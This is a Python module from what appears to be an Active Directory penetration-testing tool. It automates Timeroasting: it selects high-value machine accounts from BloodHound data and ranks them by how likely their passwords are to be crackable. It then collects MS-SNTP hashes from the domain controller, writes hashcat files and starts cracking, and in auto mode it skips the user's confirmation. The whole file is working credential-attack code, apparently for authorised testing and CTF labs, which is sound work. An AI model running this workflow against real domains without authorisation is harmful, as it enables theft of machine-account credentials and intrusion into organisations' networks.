"""CLI orchestration for Timeroasting high-value machine-account candidates."""

from __future__ import annotations

from dataclasses import asdict, dataclass
from datetime import datetime, timezone
from typing import Any, Protocol
import json
import os
import time

from rich.prompt import Confirm
from rich.table import Table

from adscan_internal import (
    print_error,
    print_info,
    print_info_debug,
    print_warning,
    telemetry,
)
from adscan_internal.cli import cracking as cracking_cli
from adscan_internal.cli.common import build_lab_event_fields
from adscan_internal.integrations.netexec.parsers import (
    ParsedTimeroastHash,
)
from adscan_internal.interaction import is_non_interactive
from adscan_internal.path_utils import get_adscan_home
from adscan_internal.principal_utils import normalize_machine_account
from adscan_internal.rich_output import (
    BRAND_COLORS,
    mark_sensitive,
    print_panel,
    print_panel_with_table,
)
from adscan_internal.services.privileged_group_classifier import sid_rid
from adscan_internal.workspaces import domain_relpath, domain_subpath
from adscan_internal.workspaces.computers import count_enabled_computer_accounts


# Default machine-account password rotation interval. Microsoft default is 30
# days. The real per-domain value is the GPO "Domain member: Maximum machine
# account password age" (registry Netlogon\Parameters\MaximumPasswordAge) — a
# MEMBER-side setting, NOT a domain LDAP attribute, so it cannot be read from the
# DC the way the user-password maxPwdAge can. Almost no domain changes it, so the
# 30-day default is used for all three rotation heuristics below (manual-early
# window, rotation-stale threshold, and the missed-rotation deadline). If a future
# collector ever recovers the GPO value, thread it in here as the single source.
_MACHINE_PASSWORD_ROTATION_SECONDS = 30 * 24 * 60 * 60
_MIN_MEANINGFUL_PASSWORD_CHANGE_GAP_SECONDS = 5 * 60
_DEFAULT_MAX_RESULTS = 250
_CANDIDATE_ARTIFACT = "timeroast_candidates.json"
_RAW_HASH_FILE = "hashes.timeroast.raw"
_NORMALIZED_HASH_FILE = "hashes.timeroast"
_LOG_FILE = "timeroast.log"


class TimeroastShell(Protocol):
    """Minimal shell surface used by the Timeroast CLI controller."""

    domains: list[str]
    domains_dir: str
    cracking_dir: str
    current_workspace_dir: str | None
    netexec_path: str | None
    auto: bool
    type: str | None
    scan_mode: str | None
    domains_data: dict[str, dict[str, Any]]

    def _get_workspace_cwd(self) -> str: ...

    def _get_graph_service(self) -> Any: ...

    def _run_netexec(
        self,
        command: str,
        *,
        domain: str | None = None,
        timeout: int | None = None,
        pre_sync: bool = True,
        **kwargs: object,
    ) -> Any: ...

    def build_auth_nxc(
        self, username: str, password: str, domain: str, kerberos: bool = True
    ) -> str: ...

    def _get_lab_slug(self) -> str | None: ...

    def run_command(
        self,
        command: str,
        *,
        timeout: int | None = None,
        shell: bool = False,
        capture_output: bool = False,
        text: bool = False,
        use_clean_env: bool | None = None,
        **kwargs: object,
    ) -> Any:
        """Execute a blocking command."""

    def add_credential(
        self, domain: str, username: str, password: str, **kwargs: object
    ) -> None:
        """Persist a recovered credential."""

    def cracking(
        self,
        crack_type: str,
        domain: str,
        hash_path: str,
        failed: bool = False,
    ) -> None:
        """Retry a cracking workflow."""

    def ask_for_kerberoast_preauth(self, domain: str, user: str) -> None:
        """Offer a follow-up pre-auth Kerberoast attempt."""

    def _is_full_adscan_container_runtime(self) -> bool: ...

    def _sudo_validate(self) -> bool: ...

    def _is_ntp_service_available(self, host: str, timeout: int = 3) -> bool: ...

    def _is_tcp_port_open(self, host: str, port: int, timeout: int = 3) -> bool: ...

    def _sync_clock_via_net_time(
        self, host: str, *, domain: str | None = None
    ) -> bool: ...

    def do_sync_clock_with_pdc(self, domain: str, verbose: bool = False) -> bool: ...


@dataclass(frozen=True, slots=True)
class TimeroastCandidate:
    """High-value machine account candidate for Timeroasting."""

    samaccountname: str
    hostname: str
    fqdn: str
    rid: int
    pwdlastset: int
    whencreated: int
    days_since_password_change: float
    creation_change_gap_days: float | None
    reasons: tuple[str, ...]
    value_tier: str
    is_high_value: bool
    is_tier_zero: bool
    operating_system: str | None = None
    lastlogon: int = 0  # epoch seconds of last authentication (0 = unknown)
    confidence: str = "medium"  # high | medium: durability of the (crackable) password
    signals: tuple[str, ...] = ()  # terse table tags (verbose explanations stay in `reasons`)


def _classify_candidate_value(row: dict[str, Any]) -> tuple[str, bool, bool]:
    """Return the BloodHound-derived criticality tier for a computer node."""

    system_tags = row.get("system_tags") or row.get("systemTags") or []
    normalized_tags = {
        str(tag).strip().lower()
        for tag in system_tags
        if isinstance(tag, str) and str(tag).strip()
    }
    is_tier_zero = bool(row.get("isTierZero")) or "admin_tier_0" in normalized_tags
    is_high_value = is_tier_zero or bool(row.get("highvalue"))

    if is_tier_zero:
        return "Tier Zero", True, True
    if is_high_value:
        return "High Value", True, False
    return "Standard", False, False


def _coerce_epoch_seconds(value: object) -> int | None:
    """Return an integer epoch-seconds value when possible."""
    if value in (None, "", 0, "0"):
        return None
    try:
        parsed = int(float(str(value).strip()))
    except (TypeError, ValueError):
        return None
    if parsed <= 0:
        return None
    return parsed


def _format_epoch_utc(value: int | None) -> str:
    """Render an epoch-seconds timestamp as a compact UTC string."""
    if not value:
        return "-"
    try:
        return datetime.fromtimestamp(value, tz=timezone.utc).strftime(
            "%Y-%m-%d %H:%M UTC"
        )
    except Exception:
        return str(value)


def _ad_filetime_to_epoch(value: object) -> int | None:
    """Convert an AD FILETIME (100ns since 1601) to epoch seconds.

    ``lastLogonTimestamp`` reaches the candidate row as a raw FILETIME (unlike
    pwdLastSet/whenCreated which the graph service pre-converts). A plausible
    epoch value is passed through unchanged so the helper is idempotent.
    """
    try:
        ft = int(float(str(value).strip()))
    except (TypeError, ValueError):
        return None
    if ft <= 0:
        return None
    if ft >= 100_000_000_000_000:  # FILETIME magnitude (~1e17), not epoch seconds
        return int(ft / 10_000_000 - 11_644_473_600)
    return ft


def _timeroast_confidence(
    *,
    cond_manual_early_change: bool,
    cond_rotation_stale: bool,
    lastlogon_epoch: int | None,
    pwdlastset_epoch: int | None,
    rotation_seconds: int = _MACHINE_PASSWORD_ROTATION_SECONDS,
) -> tuple[str, str | None]:
    """Confidence that the password is a DURABLE, crackable (non-rotating) one.

    A manual/weak machine password only persists if the account does NOT
    auto-rotate (an auto-rotating host re-randomises within ~30d). Crucially, an
    active rotating host's pwdLastSet stays under ~30d (it rotates as soon as the
    age crosses the interval). So merely "logged on recently + pwd >30d" is too
    loose: a host last seen 40d ago is really off (frozen pwd), and a pwd 31d old
    may just be mid-cycle. The rigorous test for "active but NOT rotating" is that
    the host AUTHENTICATED after its rotation was due yet the password is still
    the old one:

    - ``high``  — manual-early set (non-default), OR ``lastLogon > pwdLastSet + 30d``
      (the host was up past its rotation deadline and did not rotate → rotation
      effectively disabled (legacy/manual) → the password persists → real target).
    - ``medium`` — stale password but no PROOF of a missed rotation: the change is
      recent (deadline not yet clearly passed) or the host has not been seen since
      the deadline (may be an auto-rotated value frozen at power-off). Kept for
      coverage, lower crack odds.

    Never filters — coverage is preserved; this only ranks/annotates.
    """
    if cond_manual_early_change:
        return "high", "Password set manually shortly after creation (non-default → likely crackable)"
    # cond_rotation_stale path: HIGH only when the host proved it was up AFTER its
    # monthly rotation was due (pwdLastSet + 30d) and still did not rotate.
    if (
        lastlogon_epoch is not None
        and pwdlastset_epoch
        and lastlogon_epoch > pwdlastset_epoch + rotation_seconds
    ):
        return "high", (
            "Host authenticated AFTER its monthly rotation was due but the password "
            "did not change — rotation effectively disabled (legacy/manual); the "
            "password persists → durable crackable target"
        )
    return "medium", (
        "Stale password but no proof of a missed rotation (recent change, or host "
        "not seen since the rotation was due) — may be an auto-rotated value frozen "
        "at power-off; kept for coverage, lower crack probability"
    )


def _build_timeroast_candidate(
    row: dict[str, Any],
    *,
    domain: str,
    current_epoch: int,
    rotation_seconds: int = _MACHINE_PASSWORD_ROTATION_SECONDS,
) -> TimeroastCandidate | None:
    """Normalize one BloodHound row into a Timeroast candidate.

    ``rotation_seconds`` is the domain's machine-password rotation interval — the
    real GPO value when recovered from SYSVOL (stashed in domains_data), else the
    30d default. It drives the manual-early window, the rotation-stale threshold,
    and the missed-rotation deadline so a non-default domain is scored correctly.
    """
    if not isinstance(row, dict):
        return None

    pwdlastset = _coerce_epoch_seconds(row.get("pwdlastset"))
    whencreated = _coerce_epoch_seconds(row.get("whencreated"))
    if not pwdlastset or not whencreated:
        return None

    cond_manual_early_change = (
        pwdlastset != whencreated
        and pwdlastset > whencreated
        and (pwdlastset - whencreated)
        >= _MIN_MEANINGFUL_PASSWORD_CHANGE_GAP_SECONDS
        and (pwdlastset - whencreated) < rotation_seconds
    )
    has_post_creation_password_change = pwdlastset > whencreated
    cond_rotation_stale = (
        has_post_creation_password_change
        and (pwdlastset - whencreated)
        >= _MIN_MEANINGFUL_PASSWORD_CHANGE_GAP_SECONDS
        and (current_epoch - pwdlastset) > rotation_seconds
    )
    if not cond_manual_early_change and not cond_rotation_stale:
        return None

    object_id = str(row.get("objectid") or row.get("objectId") or "").strip()
    rid = sid_rid(object_id)
    if rid is None:
        return None

    raw_sam = (
        row.get("samaccountname")
        or row.get("samAccountName")
        or row.get("name")
        or row.get("dnshostname")
        or row.get("dNSHostName")
        or ""
    )
    samaccountname = normalize_machine_account(str(raw_sam or ""))
    if not samaccountname:
        return None

    hostname = samaccountname.rstrip("$")
    dns_host_name = str(row.get("dnshostname") or row.get("dNSHostName") or "").strip()
    name_value = str(row.get("name") or "").strip()
    if name_value and "@" in name_value:
        name_value = name_value.split("@", 1)[0].strip()
    fqdn = dns_host_name or name_value or f"{hostname}.{domain}"
    if "." not in fqdn:
        fqdn = f"{hostname}.{domain}"

    reasons: list[str] = []
    if cond_manual_early_change:
        reasons.append("Password changed shortly after account creation")
    if cond_rotation_stale:
        reasons.append("Password has not rotated in the last 30 days")
    value_tier, is_high_value, is_tier_zero = _classify_candidate_value(row)

    # Score how DURABLE (and thus genuinely crackable) the password is, using the
    # collected lastLogonTimestamp. Active-but-non-rotating ⇒ high; stale+inactive
    # ⇒ medium (possibly a frozen auto-rotated value). Never filters — coverage
    # preserved; this only ranks/annotates the candidate.
    lastlogon_epoch = _ad_filetime_to_epoch(row.get("lastlogon"))
    confidence, confidence_reason = _timeroast_confidence(
        cond_manual_early_change=cond_manual_early_change,
        cond_rotation_stale=cond_rotation_stale,
        lastlogon_epoch=lastlogon_epoch,
        pwdlastset_epoch=pwdlastset,
        rotation_seconds=rotation_seconds,
    )
    if confidence_reason:
        reasons.append(confidence_reason)

    # Terse, scannable table tags (the verbose explanations stay in `reasons`,
    # which the JSON artifact keeps). "host active" is shown only on the
    # rotation-stale path — manual-early already implies a recent change.
    signals: list[str] = []
    if confidence == "high" and cond_rotation_stale and not cond_manual_early_change:
        signals.append("host active")
    if cond_manual_early_change:
        signals.append("manual set post-create")
    if cond_rotation_stale:
        signals.append("no rotation >30d")

    change_gap_days = None
    if pwdlastset > whencreated:
        change_gap_days = (pwdlastset - whencreated) / 86400.0

    return TimeroastCandidate(
        samaccountname=samaccountname,
        hostname=hostname,
        fqdn=fqdn,
        rid=rid,
        pwdlastset=pwdlastset,
        whencreated=whencreated,
        days_since_password_change=(current_epoch - pwdlastset) / 86400.0,
        creation_change_gap_days=change_gap_days,
        reasons=tuple(reasons),
        value_tier=value_tier,
        is_high_value=is_high_value,
        is_tier_zero=is_tier_zero,
        operating_system=str(row.get("operatingsystem") or "").strip() or None,
        lastlogon=lastlogon_epoch or 0,
        confidence=confidence,
        signals=tuple(signals),
    )


def _resolve_rotation_seconds(shell: TimeroastShell, domain: str) -> int:
    """Return the domain's machine-password rotation interval in seconds.

    Prefers the real GPO value recovered from SYSVOL (stashed by the collector in
    ``domains_data[domain]['machine_pwd_rotation_days']``); falls back to the 30d
    default. A disabled-rotation domain leaves the key unset on purpose, so the
    default keeps the threshold low and every stale machine stays a candidate.
    """
    try:
        days = (shell.domains_data.get(domain, {}) or {}).get("machine_pwd_rotation_days")
        if isinstance(days, (int, float)) and days > 0:
            return int(days) * 24 * 60 * 60
    except Exception:  # noqa: BLE001 — best-effort, fall back to the default
        pass
    return _MACHINE_PASSWORD_ROTATION_SECONDS


def _get_timeroast_candidates(
    shell: TimeroastShell,
    domain: str,
) -> list[TimeroastCandidate]:
    """Query the graph service and normalize Timeroast candidates."""
    try:
        service_getter = getattr(shell, "_get_graph_service", None) or getattr(
            shell,
            "_get_graph_service",
            None,
        )
        if not callable(service_getter):
            return []
        service = service_getter()
        raw_rows = service.get_timeroast_candidates(
            domain,
            max_results=_DEFAULT_MAX_RESULTS,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(
            f"Graph Timeroast candidate query failed for {marked_domain}."
        )
        print_info_debug(
            f"[timeroast] candidate query failed for {marked_domain}: {exc}"
        )
        return []

    current_epoch = int(time.time())
    rotation_seconds = _resolve_rotation_seconds(shell, domain)
    candidates: list[TimeroastCandidate] = []
    seen_rids: set[int] = set()
    for row in raw_rows or []:
        candidate = _build_timeroast_candidate(
            row if isinstance(row, dict) else {},
            domain=domain,
            current_epoch=current_epoch,
            rotation_seconds=rotation_seconds,
        )
        if candidate is None or candidate.rid in seen_rids:
            continue
        seen_rids.add(candidate.rid)
        candidates.append(candidate)

    candidates.sort(
        key=lambda item: (
            0 if item.is_tier_zero else 1 if item.is_high_value else 2,
            # Durable (high-confidence) crackable passwords first within each tier —
            # active non-rotating / manual-early beat inactive-stale (possibly frozen
            # auto-rotated). All are kept; this only ranks (coverage preserved).
            0 if item.confidence == "high" else 1,
            item.days_since_password_change * -1,
            item.fqdn.lower(),
        )
    )
    return candidates


def _should_skip_ctf_timeroast_due_to_single_computer(
    shell: TimeroastShell,
    domain: str,
) -> bool:
    """Return True when CTF Timeroast should be skipped due to a trivial computer set."""

    if str(getattr(shell, "type", "") or "").strip().lower() != "ctf":
        return False

    workspace_cwd = shell.current_workspace_dir or os.getcwd()
    marked_domain = mark_sensitive(domain, "domain")
    try:
        count = count_enabled_computer_accounts(workspace_cwd, shell.domains_dir, domain)
    except OSError as exc:
        print_info_debug(
            "[timeroast] enabled computer count unavailable for "
            f"{marked_domain}: {mark_sensitive(str(exc), 'detail')}"
        )
        return False

    print_info_debug(
        f"[timeroast] enabled computer count for {marked_domain}: {count}"
    )
    return count <= 1


def _write_timeroast_candidate_artifact(
    shell: TimeroastShell,
    domain: str,
    candidates: list[TimeroastCandidate],
) -> tuple[str, str] | None:
    """Persist Timeroast candidate metadata to the workspace."""
    workspace_cwd = shell._get_workspace_cwd()
    artifact_abs = domain_subpath(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.cracking_dir,
        _CANDIDATE_ARTIFACT,
    )
    artifact_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.cracking_dir,
        _CANDIDATE_ARTIFACT,
    )
    os.makedirs(os.path.dirname(artifact_abs), exist_ok=True)

    payload = {
        "generated_at": datetime.now(timezone.utc).replace(microsecond=0).isoformat(),
        "domain": domain,
        "count": len(candidates),
        "candidates": [asdict(candidate) for candidate in candidates],
    }
    try:
        with open(artifact_abs, "w", encoding="utf-8") as handle:
            json.dump(payload, handle, indent=2, sort_keys=True)
            handle.write("\n")
    except OSError as exc:
        telemetry.capture_exception(exc)
        print_warning("Failed to persist Timeroast candidate metadata.")
        return None
    return artifact_abs, artifact_rel


def _render_timeroast_candidates(
    domain: str,
    candidates: list[TimeroastCandidate],
    *,
    artifact_rel: str | None = None,
) -> None:
    """Render a high-signal Timeroast candidate summary."""
    marked_domain = mark_sensitive(domain, "domain")
    tier_zero_count = sum(1 for candidate in candidates if candidate.is_tier_zero)
    high_value_count = sum(
        1
        for candidate in candidates
        if candidate.is_high_value and not candidate.is_tier_zero
    )
    standard_count = max(0, len(candidates) - tier_zero_count - high_value_count)
    summary_lines = [
        "These machine accounts deviate from the default monthly computer-password rotation.",
        "Use the criticality column to separate Tier Zero and high-value systems from standard hosts.",
        "",
        f"Domain: {marked_domain}",
        f"Candidates: {len(candidates)}",
        f"Tier Zero: {tier_zero_count}",
        f"High Value: {high_value_count}",
        f"Standard: {standard_count}",
    ]
    if artifact_rel:
        summary_lines.append(f"Artifact: {mark_sensitive(artifact_rel, 'path')}")
    print_panel(
        "\n".join(summary_lines),
        title="[bold yellow]Prioritized Timeroast Candidates[/bold yellow]",
        border_style="yellow",
        expand=False,
    )

    shown = candidates[:15]
    show_os = any((candidate.operating_system or "").strip() for candidate in shown)

    table = Table(
        show_header=True,
        header_style="bold cyan",
        caption=(
            "[dim]Priority HIGH = manual-set or active-but-not-rotating "
            "(durable, crackable).  MED = stale but host inactive "
            "(may be a frozen random value); kept for coverage.[/dim]"
        ),
        caption_justify="left",
    )
    table.add_column("Computer", style="white")
    table.add_column("Value", style="red")
    table.add_column("Priority", justify="center")
    table.add_column("RID", style="magenta", justify="right")
    table.add_column("Signals", style="yellow")
    table.add_column("PwdLastSet", style="cyan")
    table.add_column("Created", style="cyan")
    if show_os:
        table.add_column("OS", style="green")

    for candidate in shown:
        value_style = (
            "[bold red]Tier Zero[/bold red]"
            if candidate.is_tier_zero
            else "[bold yellow]High Value[/bold yellow]"
            if candidate.is_high_value
            else "[dim]Standard[/dim]"
        )
        priority = (
            "[bold green]● HIGH[/bold green]"
            if candidate.confidence == "high"
            else "[dim]● MED[/dim]"
        )
        # Terse tags; fall back to the verbose reasons if (defensively) empty.
        signals = " · ".join(candidate.signals) or "\n".join(candidate.reasons)
        cells = [
            mark_sensitive(candidate.fqdn, "hostname"),
            value_style,
            priority,
            str(candidate.rid),
            signals,
            _format_epoch_utc(candidate.pwdlastset),
            _format_epoch_utc(candidate.whencreated),
        ]
        if show_os:
            cells.append(candidate.operating_system or "-")
        table.add_row(*cells)

    title = f"Timeroast Target Preview ({min(len(candidates), 15)} shown)"
    print_panel_with_table(
        table,
        title=title,
        border_style=BRAND_COLORS["warning"],
        expand=True,
    )


def _build_timeroast_paths(
    shell: TimeroastShell,
    domain: str,
) -> dict[str, str]:
    """Return absolute and relative Timeroast artifact paths."""
    workspace_cwd = shell._get_workspace_cwd()
    return {
        "raw_hash_abs": domain_subpath(
            workspace_cwd,
            shell.domains_dir,
            domain,
            shell.cracking_dir,
            _RAW_HASH_FILE,
        ),
        "normalized_hash_abs": domain_subpath(
            workspace_cwd,
            shell.domains_dir,
            domain,
            shell.cracking_dir,
            _NORMALIZED_HASH_FILE,
        ),
        "log_abs": domain_subpath(
            workspace_cwd,
            shell.domains_dir,
            domain,
            shell.cracking_dir,
            _LOG_FILE,
        ),
        "normalized_hash_rel": domain_relpath(
            shell.domains_dir,
            domain,
            shell.cracking_dir,
            _NORMALIZED_HASH_FILE,
        ),
        "log_rel": domain_relpath(
            shell.domains_dir,
            domain,
            shell.cracking_dir,
            _LOG_FILE,
        ),
    }


def _write_timeroast_hash_files(
    *,
    paths: dict[str, str],
    candidates_by_rid: dict[int, TimeroastCandidate],
    parsed_hashes: list[ParsedTimeroastHash],
) -> tuple[str | None, list[TimeroastCandidate]]:
    """Persist raw Timeroast output and filtered hashcat-ready hashes."""
    os.makedirs(os.path.dirname(paths["raw_hash_abs"]), exist_ok=True)
    matched_candidates: list[TimeroastCandidate] = []
    seen_candidate_rids: set[int] = set()

    try:
        with open(paths["raw_hash_abs"], "w", encoding="utf-8") as raw_handle:
            for parsed in parsed_hashes:
                raw_handle.write(f"{parsed.rid}:{parsed.hash_value}\n")
    except OSError as exc:
        telemetry.capture_exception(exc)
        print_warning("Failed to persist raw Timeroast hashes.")

    normalized_lines: list[str] = []
    for parsed in parsed_hashes:
        candidate = candidates_by_rid.get(parsed.rid)
        if candidate is None:
            continue
        normalized_lines.append(f"{candidate.samaccountname}:{parsed.hash_value}")
        if candidate.rid not in seen_candidate_rids:
            seen_candidate_rids.add(candidate.rid)
            matched_candidates.append(candidate)

    if not normalized_lines:
        return None, []

    try:
        with open(paths["normalized_hash_abs"], "w", encoding="utf-8") as handle:
            handle.write("\n".join(normalized_lines) + "\n")
    except OSError as exc:
        telemetry.capture_exception(exc)
        print_error("Failed to persist filtered Timeroast hashes.")
        return None, []

    return paths["normalized_hash_abs"], matched_candidates


def _collect_timeroast_hashes(
    shell: TimeroastShell,
    domain: str,
    candidates: list[TimeroastCandidate],
) -> str | None:
    """Run native Timeroast (MS-SNTP UDP) and write hashcat-ready hashes."""
    import asyncio

    from adscan_internal.services.timeroasting.config import TimeroastConfig
    from adscan_internal.services.timeroasting.display import (
        print_timeroast_preflight,
        print_timeroast_results,
        run_timeroast_with_display,
    )
    from adscan_internal.integrations.netexec.parsers import ParsedTimeroastHash

    pdc = str(shell.domains_data.get(domain, {}).get("pdc") or "").strip()
    if not pdc:
        print_error(f"PDC is not configured for {mark_sensitive(domain, 'domain')}.")
        return None

    if not candidates:
        print_warning("No timeroast candidates — nothing to probe.")
        return None

    candidates_by_rid = {c.rid: c for c in candidates}
    rids = tuple(c.rid for c in candidates)

    paths = _build_timeroast_paths(shell, domain)
    os.makedirs(os.path.dirname(paths["log_abs"]), exist_ok=True)

    cfg = TimeroastConfig(
        dc_ip=pdc,
        rids=rids,
        rate=180,
        timeout=24.0,
    )

    print_timeroast_preflight(
        dc_ip=pdc,
        domain=domain,
        candidate_count=len(candidates),
        rate=cfg.rate,
        timeout=cfg.timeout,
    )

    try:
        result = asyncio.run(
            run_timeroast_with_display(cfg, candidates_by_rid=candidates_by_rid)
        )
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_error(f"Native timeroast failed: {exc}")
        return None

    if result.error:
        print_error(f"Timeroast error: {result.error}")
        return None

    if not result.hashes:
        print_warning(
            "No NTP responses captured. Verify UDP/123 is reachable from this host "
            "and the candidate RIDs correspond to existing accounts."
        )
        return None

    # Convert native results → ParsedTimeroastHash for shared persistence logic
    parsed_hashes = [
        ParsedTimeroastHash(rid=h.rid, hash_value=h.hashcat_line.split(":", 1)[1])
        for h in result.hashes
    ]

    normalized_hash_file, matched_candidates = _write_timeroast_hash_files(
        paths=paths,
        candidates_by_rid=candidates_by_rid,
        parsed_hashes=parsed_hashes,
    )

    print_timeroast_results(
        result,
        candidates_by_rid=candidates_by_rid,
        hash_file_path=normalized_hash_file,
    )

    if not normalized_hash_file:
        print_warning("Hashes captured but none matched candidate RIDs for filtering.")
        return None

    print_info(
        f"Hashes saved to {mark_sensitive(paths['normalized_hash_rel'], 'path')}."
    )
    return normalized_hash_file


def run_timeroast_quick_win(shell: TimeroastShell, target_domain: str) -> bool:
    """Run the Phase 3 Timeroast quick win when BloodHound flags candidates."""
    from adscan_internal.services.scan_phases import (
        phase_is_enabled,
        subphase_is_enabled,
    )

    if not phase_is_enabled(shell, "quick_credential_wins"):
        return False
    if not subphase_is_enabled(shell, "quick_credential_wins", "timeroast"):
        print_info("Timeroast candidate check skipped (disabled in scan configuration).")
        return False
    if target_domain not in shell.domains:
        marked_target_domain = mark_sensitive(target_domain, "domain")
        print_error(
            f"Domain '{marked_target_domain}' is not configured. "
            "Please add or select a valid domain."
        )
        return False

    if _should_skip_ctf_timeroast_due_to_single_computer(shell, target_domain):
        marked_domain = mark_sensitive(target_domain, "domain")
        print_info(
            f"Skipping Timeroast candidate checks in {marked_domain}: only one enabled computer account was found."
        )
        print_info_debug(
            "[timeroast] CTF quick win skipped because pre2k/timeroast heuristics "
            "do not add value with <= 1 enabled computer."
        )
        return False

    candidates = _get_timeroast_candidates(shell, target_domain)
    if not candidates:
        marked_domain = mark_sensitive(target_domain, "domain")
        print_info(
            f"No Timeroast candidates were identified in {marked_domain} by BloodHound."
        )
        return False

    artifact_info = _write_timeroast_candidate_artifact(
        shell, target_domain, candidates
    )
    artifact_rel = artifact_info[1] if artifact_info else None
    _render_timeroast_candidates(target_domain, candidates, artifact_rel=artifact_rel)

    should_execute = True
    if shell.auto or is_non_interactive(shell=shell):
        print_info("Auto mode detected. Proceeding with Timeroasting candidates.")
    else:
        should_execute = Confirm.ask(
            "Do you want to try Timeroasting these machine-account candidates now?",
            default=True,
        )
    if not should_execute:
        print_info("Timeroast quick win skipped by user.")
        return False

    normalized_hash_file = _collect_timeroast_hashes(shell, target_domain, candidates)
    if not normalized_hash_file:
        return False

    try:
        telemetry.capture(
            "timeroast_started",
            {
                "domain": target_domain,
                "candidate_count": len(candidates),
                "scan_mode": getattr(shell, "scan_mode", None),
                "workspace_type": getattr(shell, "type", None),
                **build_lab_event_fields(shell=shell, include_slug=True),
            },
        )
    except Exception as exc:  # pragma: no cover - telemetry best effort
        telemetry.capture_exception(exc)

    cracking_cli.run_cracking(
        shell,
        hash_type="timeroast",
        domain=target_domain,
        hash_file=normalized_hash_file,
        wordlists_dir=str(get_adscan_home() / "wordlists"),
        failed=False,
    )
    return True


__all__ = ["run_timeroast_quick_win"]
